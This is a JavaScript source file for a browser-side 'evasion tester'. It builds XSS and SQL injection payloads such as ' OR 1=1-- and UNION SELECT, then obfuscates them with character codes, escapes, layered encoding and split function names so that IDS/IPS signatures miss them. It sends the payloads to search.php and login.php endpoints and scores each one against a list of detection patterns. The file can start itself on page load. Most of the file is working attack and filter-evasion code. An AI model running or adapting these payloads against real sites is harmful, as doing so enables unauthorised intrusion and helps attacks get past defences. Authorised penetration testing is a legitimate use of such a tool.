/**
 * Client-Side Advanced Evasion Tester
 * JavaScript-based IDS/IPS bypass testing
 */

class ClientSideEvasionTester {
    constructor(baseUrl) {
        this.baseUrl = baseUrl.replace(/\/$/, '');
        this.results = [];
        this.testId = 1;
    }

    // Multi-layer encoding functions
    multiLayerEncode(payload) {
        // Layer 1: Base64
        let encoded = btoa(payload);
        // Layer 2: URL encoding
        encoded = encodeURIComponent(encoded);
        // Layer 3: Double URL encoding
        encoded = encodeURIComponent(encoded);
        return encoded;
    }

    // Character code obfuscation
    toCharCodes(str) {
        return str.split('').map(char => `String.fromCharCode(${char.charCodeAt(0)})`).join('+');
    }

    // Unicode escape encoding
    toUnicodeEscape(str) {
        return str.split('').map(char => {
            const code = char.charCodeAt(0);
            return code > 127 ? `\\u${code.toString(16).padStart(4, '0')}` : char;
        }).join('');
    }

    // Hex escape encoding
    toHexEscape(str) {
        return str.split('').map(char => {
            const code = char.charCodeAt(0);
            return code > 31 && code < 127 ? char : `\\x${code.toString(16).padStart(2, '0')}`;
        }).join('');
    }

    // Generate DOM-based XSS payloads
    generateDOMXSSPayloads() {
        const basePayloads = {
            'innerHTML_injection': {
                original: '<script>alert("DOM XSS")</script>',
                description: 'Direct innerHTML injection'
            },
            'location_hash': {
                original: '#<script>alert("Hash XSS")</script>',
                description: 'Location hash manipulation'
            },
            'document_write': {
                original: 'document.write(\'<script>alert("Write XSS")</script>\')',
                description: 'Document.write injection'
            },
            'eval_injection': {
                original: 'eval("alert(\'Eval XSS\')")',
                description: 'Eval function injection'
            }
        };

        const evadedPayloads = {};

        Object.entries(basePayloads).forEach(([name, payload]) => {
            evadedPayloads[name] = {
                ...payload,
                evaded: {
                    char_codes: this.toCharCodes(payload.original),
                    unicode_escape: this.toUnicodeEscape(payload.original),
                    hex_escape: this.toHexEscape(payload.original),
                    multi_encoded: this.multiLayerEncode(payload.original),
                    template_literal: `\`${payload.original}\``,
                    obfuscated_eval: payload.original.replace('eval', 'window["ev"+"al"]'),
                    string_concat: payload.original.split('').map(c => `"${c}"`).join('+'),
                    regex_replace: payload.original.replace(/alert/g, 'window["al"+"ert"]'),
                    function_constructor: `(function(){${payload.original}})()`,
                    setTimeout_delay: `setTimeout(function(){${payload.original}}, 0)`
                }
            };
        });

        return evadedPayloads;
    }

    // Generate client-side SQL injection tests
    generateClientSQLTests() {
        return {
            'ajax_parameter': {
                original: "' OR 1=1--",
                description: 'AJAX parameter injection',
                evaded: {
                    json_injection: '{"query":"\\u0027 OR 1=1--"}',
                    base64_param: btoa("' OR 1=1--"),
                    url_fragment: "#' OR 1=1--",
                    form_data_pollution: new URLSearchParams([['q', "'"], ['q', ' OR 1=1--']]).toString()
                }
            },
            'websocket_injection': {
                original: '{"cmd":"search","query":"\' OR 1=1--"}',
                description: 'WebSocket message injection',
                evaded: {
                    json_escape: '{"cmd":"search","query":"\\u0027 OR 1=1--"}',
                    double_json: JSON.stringify({ "cmd": "search", "query": "' OR 1=1--" }),
                    fragmented: '{"cmd":"sear"+"ch","query":"\\x27 OR 1=1--"}'
                }
            }
        };
    }

    // Test DOM manipulation vulnerabilities
    async testDOMManipulation(payload) {
        return new Promise((resolve) => {
            try {
                // Create a test element
                const testDiv = document.createElement('div');
                testDiv.id = 'xss-test-' + Date.now();
                testDiv.style.display = 'none';
                document.body.appendChild(testDiv);

                // Test innerHTML injection
                let executed = false;
                const originalAlert = window.alert;
                window.alert = () => { executed = true; };

                try {
                    testDiv.innerHTML = payload;

                    // Test script execution
                    const scripts = testDiv.querySelectorAll('script');
                    scripts.forEach(script => {
                        try {
                            eval(script.textContent);
                        } catch (e) {
                            // Script execution failed
                        }
                    });

                    // Test event handlers
                    const elementsWithEvents = testDiv.querySelectorAll('[onload], [onerror], [onclick]');
                    elementsWithEvents.forEach(elem => {
                        try {
                            // Trigger events
                            if (elem.onload) elem.onload();
                            if (elem.onerror) elem.onerror();
                            if (elem.onclick) elem.onclick();
                        } catch (e) {
                            // Event execution failed
                        }
                    });

                } catch (e) {
                    // Payload injection failed
                }

                // Cleanup
                window.alert = originalAlert;
                document.body.removeChild(testDiv);

                resolve({
                    executed: executed,
                    payload_injected: testDiv.innerHTML.includes(payload),
                    script_tags: testDiv.querySelectorAll('script').length,
                    event_handlers: testDiv.querySelectorAll('[onload], [onerror], [onclick]').length
                });

            } catch (error) {
                resolve({ error: error.message });
            }
        });
    }

    // Test AJAX-based injection
    async testAJAXInjection(endpoint, payload) {
        return new Promise((resolve) => {
            const xhr = new XMLHttpRequest();
            const startTime = Date.now();

            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4) {
                    const responseTime = Date.now() - startTime;

                    resolve({
                        status: xhr.status,
                        response_time: responseTime,
                        response_length: xhr.responseText.length,
                        contains_payload: xhr.responseText.includes(payload),
                        sql_error: /sql|mysql|error|syntax/i.test(xhr.responseText),
                        xss_reflected: xhr.responseText.includes('<script>') || xhr.responseText.includes('alert'),
                        response_headers: xhr.getAllResponseHeaders()
                    });
                }
            };

            xhr.onerror = function () {
                resolve({ error: 'Network error' });
            };

            try {
                xhr.open('GET', `${this.baseUrl}/${endpoint}?q=${encodeURIComponent(payload)}`, true);
                xhr.send();
            } catch (error) {
                resolve({ error: error.message });
            }
        });
    }

    // Test POST-based injection
    async testPOSTInjection(endpoint, payload) {
        return new Promise((resolve) => {
            const xhr = new XMLHttpRequest();
            const startTime = Date.now();

            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4) {
                    const responseTime = Date.now() - startTime;

                    resolve({
                        status: xhr.status,
                        response_time: responseTime,
                        contains_payload: xhr.responseText.includes(payload),
                        sql_error: /sql|mysql|error/i.test(xhr.responseText),
                        success_indicators: /berhasil|success|welcome|profile/i.test(xhr.responseText)
                    });
                }
            };

            xhr.onerror = function () {
                resolve({ error: 'Network error' });
            };

            try {
                xhr.open('POST', `${this.baseUrl}/${endpoint}`, true);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

                const formData = `username=${encodeURIComponent(payload)}&password=test123`;
                xhr.send(formData);
            } catch (error) {
                resolve({ error: error.message });
            }
        });
    }

    // Analyze detection evasion effectiveness
    analyzeDetectionEvasion(payload) {
        const patterns = {
            single_quote: !payload.includes("'"),
            script_tag: !/<script>/i.test(payload),
            alert_function: !/alert\s*\(/i.test(payload),
            javascript_protocol: !/javascript\s*:/i.test(payload),
            onload_event: !/onload\s*=/i.test(payload),
            onerror_event: !/onerror\s*=/i.test(payload),
            eval_function: !/eval\s*\(/i.test(payload),
            document_write: !/document\.write/i.test(payload),
            innerHTML_access: !/innerHTML/i.test(payload),
            union_select: !/union\s+select/i.test(payload),
            or_1_equals_1: !/' OR 1=1/i.test(payload),
            sql_comments: !/--|\/\*|\*\//i.test(payload),
            extractvalue: !/extractvalue/i.test(payload),
            sleep_function: !/sleep\s*\(/i.test(payload),
            information_schema: !/information_schema/i.test(payload),
            base64_encoded: !/[A-Za-z0-9+\/=]{20,}/.test(payload),
            unicode_escape: !/\\u[0-9a-f]{4}/i.test(payload),
            hex_escape: !/\\x[0-9a-f]{2}/i.test(payload)
        };

        const evasionScore = Object.values(patterns).filter(Boolean).length / Object.keys(patterns).length * 100;

        return {
            patterns_evaded: patterns,
            evasion_percentage: Math.round(evasionScore * 100) / 100,
            likely_undetected: evasionScore > 70
        };
    }

    // Run comprehensive client-side tests
    async runComprehensiveTest() {
        console.log('🚀 Starting Client-Side Evasion Testing...');

        const results = {
            dom_xss_tests: {},
            ajax_tests: {},
            post_tests: {},
            summary: {
                total_tests: 0,
                successful_executions: 0,
                high_evasion_count: 0,
                average_evasion_score: 0
            }
        };

        const evasionScores = [];

        // Test DOM-based XSS
        console.log('🎯 Testing DOM-based XSS...');
        const domPayloads = this.generateDOMXSSPayloads();

        for (const [payloadName, payloadData] of Object.entries(domPayloads)) {
            results.dom_xss_tests[payloadName] = {};

            for (const [variantName, payload] of Object.entries(payloadData.evaded)) {
                console.log(`  Testing ${payloadName} - ${variantName}...`);

                const domResult = await this.testDOMManipulation(payload);
                const evasionAnalysis = this.analyzeDetectionEvasion(payload);

                evasionScores.push(evasionAnalysis.evasion_percentage);

                if (evasionAnalysis.evasion_percentage > 80) {
                    results.summary.high_evasion_count++;
                }

                if (domResult.executed) {
                    results.summary.successful_executions++;
                }

                results.dom_xss_tests[payloadName][variantName] = {
                    payload: payload,
                    dom_test: domResult,
                    evasion_analysis: evasionAnalysis
                };

                results.summary.total_tests++;
                await new Promise(resolve => setTimeout(resolve, 100)); // Small delay
            }
        }

        // Test AJAX injections
        console.log('🎯 Testing AJAX-based injections...');
        const ajaxPayloads = this.generateClientSQLTests();

        for (const [payloadName, payloadData] of Object.entries(ajaxPayloads)) {
            results.ajax_tests[payloadName] = {};

            for (const [variantName, payload] of Object.entries(payloadData.evaded)) {
                console.log(`  Testing ${payloadName} - ${variantName}...`);

                const ajaxResult = await this.testAJAXInjection('search.php', payload);
                const evasionAnalysis = this.analyzeDetectionEvasion(payload);

                evasionScores.push(evasionAnalysis.evasion_percentage);

                if (evasionAnalysis.evasion_percentage > 80) {
                    results.summary.high_evasion_count++;
                }

                if (ajaxResult.sql_error || ajaxResult.contains_payload) {
                    results.summary.successful_executions++;
                }

                results.ajax_tests[payloadName][variantName] = {
                    payload: payload,
                    ajax_test: ajaxResult,
                    evasion_analysis: evasionAnalysis
                };

                results.summary.total_tests++;
                await new Promise(resolve => setTimeout(resolve, 200)); // Small delay
            }
        }

        // Test POST injections
        console.log('🎯 Testing POST-based injections...');
        const postPayloads = ["' OR '1'='1'--", "admin'/**/OR/**/1=1--", "' UNION SELECT null,null,null--"];

        for (const payload of postPayloads) {
            const postResult = await this.testPOSTInjection('login.php', payload);
            const evasionAnalysis = this.analyzeDetectionEvasion(payload);

            evasionScores.push(evasionAnalysis.evasion_percentage);

            if (evasionAnalysis.evasion_percentage > 80) {
                results.summary.high_evasion_count++;
            }

            if (postResult.success_indicators) {
                results.summary.successful_executions++;
            }

            results.post_tests[`post_${results.summary.total_tests}`] = {
                payload: payload,
                post_test: postResult,
                evasion_analysis: evasionAnalysis
            };

            results.summary.total_tests++;
            await new Promise(resolve => setTimeout(resolve, 300));
        }

        // Calculate averages
        if (evasionScores.length > 0) {
            results.summary.average_evasion_score = Math.round(
                (evasionScores.reduce((a, b) => a + b, 0) / evasionScores.length) * 100
            ) / 100;
        }

        return results;
    }

    // Display results in the browser
    displayResults(results) {
        const resultsContainer = document.createElement('div');
        resultsContainer.id = 'evasion-test-results';
        resultsContainer.style.cssText = `
            position: fixed;
            top: 10px;
            right: 10px;
            width: 400px;
            max-height: 80vh;
            background: #1a1a1a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            padding: 20px;
            border: 2px solid #00ff00;
            border-radius: 5px;
            overflow-y: auto;
            z-index: 9999;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
        `;

        const summary = results.summary;
        const successRate = Math.round((summary.successful_executions / summary.total_tests) * 100);

        let html = `
            <h3 style="color: #ff6b6b; margin: 0 0 15px 0;">🥷 CLIENT-SIDE EVASION RESULTS</h3>
            <div style="margin-bottom: 15px;">
                <strong>📊 SUMMARY:</strong><br>
                • Total Tests: ${summary.total_tests}<br>
                • Successful Executions: ${summary.successful_executions}<br>
                • Success Rate: ${successRate}%<br>
                • High Evasion Count: ${summary.high_evasion_count}<br>
                • Avg Evasion Score: ${summary.average_evasion_score}%<br>
            </div>
        `;

        // Risk assessment
        if (summary.average_evasion_score > 80) {
            html += '<div style="color: #ff4444; font-weight: bold;">🚨 CRITICAL RISK</div>';
        } else if (summary.average_evasion_score > 60) {
            html += '<div style="color: #ffaa00; font-weight: bold;">⚠️ HIGH RISK</div>';
        } else {
            html += '<div style="color: #00ff00; font-weight: bold;">✅ LOW RISK</div>';
        }

        // Top successful payloads
        html += '<div style="margin-top: 15px;"><strong>🔥 TOP EVASIONS:</strong><br>';

        let allTests = [];
        ['dom_xss_tests', 'ajax_tests', 'post_tests'].forEach(category => {
            Object.entries(results[category]).forEach(([name, variants]) => {
                if (typeof variants === 'object') {
                    Object.entries(variants).forEach(([variant, test]) => {
                        if (test.evasion_analysis) {
                            allTests.push({
                                name: `${name}-${variant}`,
                                score: test.evasion_analysis.evasion_percentage,
                                payload: test.payload
                            });
                        }
                    });
                }
            });
        });

        allTests.sort((a, b) => b.score - a.score);
        allTests.slice(0, 5).forEach((test, i) => {
            html += `<div style="margin: 5px 0; color: #ffff00;">
                ${i + 1}. ${test.name} (${test.score}%)<br>
                <span style="color: #cccccc; font-size: 10px;">${test.payload.substring(0, 50)}...</span>
            </div>`;
        });

        html += '</div>';

        // Close button
        html += `
            <button onclick="document.body.removeChild(document.getElementById('evasion-test-results'))" 
                    style="position: absolute; top: 5px; right: 10px; background: #ff4444; color: white; border: none; padding: 5px 10px; cursor: pointer;">
                ✕
            </button>
        `;

        resultsContainer.innerHTML = html;
        document.body.appendChild(resultsContainer);
    }

    // Export results to JSON
    exportResults(results) {
        const dataStr = JSON.stringify(results, null, 2);
        const dataBlob = new Blob([dataStr], { type: 'application/json' });
        const url = URL.createObjectURL(dataBlob);

        const link = document.createElement('a');
        link.href = url;
        link.download = `client_evasion_results_${Date.now()}.json`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        URL.revokeObjectURL(url);
    }
}

// Auto-start testing when page loads
window.addEventListener('load', async function () {
    // Only run on pages with testing capability
    if (window.location.pathname.includes('test') ||
        window.location.search.includes('auto_test=1')) {

        console.log('🥷 Auto-starting client-side evasion testing...');

        const tester = new ClientSideEvasionTester(window.location.origin + '/Musywar');

        try {
            const results = await tester.runComprehensiveTest();
            console.log('✅ Client-side testing completed!', results);

            // Display results
            tester.displayResults(results);

            // Auto-export results
            setTimeout(() => {
                tester.exportResults(results);
            }, 1000);

        } catch (error) {
            console.error('❌ Client-side testing failed:', error);
        }
    }
});

// Manual testing trigger
window.runClientEvasionTest = async function () {
    const tester = new ClientSideEvasionTester(window.location.origin + '/Musywar');
    const results = await tester.runComprehensiveTest();
    tester.displayResults(results);
    return results;
};
